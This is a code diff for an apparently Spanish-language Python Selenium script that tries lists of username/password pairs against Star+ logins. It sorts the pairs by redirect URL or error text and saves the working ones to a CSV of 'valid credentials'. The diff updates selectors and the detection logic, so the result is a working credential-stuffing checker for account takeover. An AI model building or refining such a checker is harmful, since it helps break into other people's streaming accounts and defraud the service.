@@ -28,7 +28,7 @@ def iniciar_sesion(usuario, contrasena, credenciales_validas):
 
         # Hacer clic en 'Siguiente'
         submit_next = WebDriverWait(driver, 10).until(
-            EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div[2]/button'))
+            EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div/div[4]/div/main/div/form/div[2]/button'))
         )
         submit_next.click()
 
@@ -40,15 +40,19 @@ def iniciar_sesion(usuario, contrasena, credenciales_validas):
 
         # Hacer clic en 'Iniciar Sesión'
         submit_login = WebDriverWait(driver, 10).until(
-            EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div/button'))
+            EC.element_to_be_clickable((By.XPATH, '//*[@id="password-continue-login"]'))
+            
         )
         submit_login.click()
 
         time.sleep(8)
 
         # Verificar si se redirige a la página de prueba
-        if driver.current_url == 'https://www.starplus.com/es-419/restart-subscription':
-            print(f"Las credenciales {usuario}, {contrasena} son inválidas (página de prueba).")
+        error_message = "Ocurrió un error al iniciar sesión."
+        if driver.current_url == 'https://www.starplus.com/es-419/restart-subscription'or driver.current_url == 'https://www.starplus.com/es-419/complete-purchase':
+            print(f"Las credenciales {usuario}, {contrasena} son inválidas o son de prueba.")
+        elif error_message in driver.page_source:
+            print(f"Las credenciales {usuario}, {contrasena} no funcionan... Intentando con el siguiente conjunto.")
         else:
             print(f"Las credenciales {usuario}, {contrasena} funcionan correctamente")
             credenciales_validas.append((usuario, contrasena))
@@ -88,9 +92,9 @@ if os.path.isfile(csv_file_path):
 
 # Guardar las credenciales válidas en un archivo .csv
 if credenciales_validas:
-    locale.setlocale(locale.LC_TIME, 'en_ES.UTF-8')
+    locale.setlocale(locale.LC_TIME, 'es_ES.UTF-8')
     now = datetime.now()
-    format_date = now.strftime('%d-%b-%Y_%I-%M-%S %p')  # Formato de fecha en el nombre del archivo
+    format_date = now.strftime('%d-%b-%Y_%I-%M-%S')  # Formato de fecha en el nombre del archivo
 
     # Guardar las credenciales válidas en un archivo .csv
     file_path = f'results/credenciales_validas_starplus_{format_date}.csv'
